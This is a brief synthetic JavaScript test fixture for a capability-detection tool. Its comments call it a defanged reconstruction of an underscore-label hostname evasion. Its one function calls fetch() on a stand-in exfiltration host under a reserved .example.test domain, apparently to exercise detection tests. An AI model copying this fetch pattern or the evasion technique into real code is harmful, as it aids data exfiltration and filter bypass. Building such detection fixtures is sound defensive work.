// DEFANGED RECONSTRUCTION for ADR-029, modeled on an underscore-label evasion.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: a fetch to a host whose second label contains an underscore.
// Omitted: every network call; the host is a reserved .example.test name.
module.exports = function run() {
  return fetch("https://a_b.exfil.example.test/c");
};
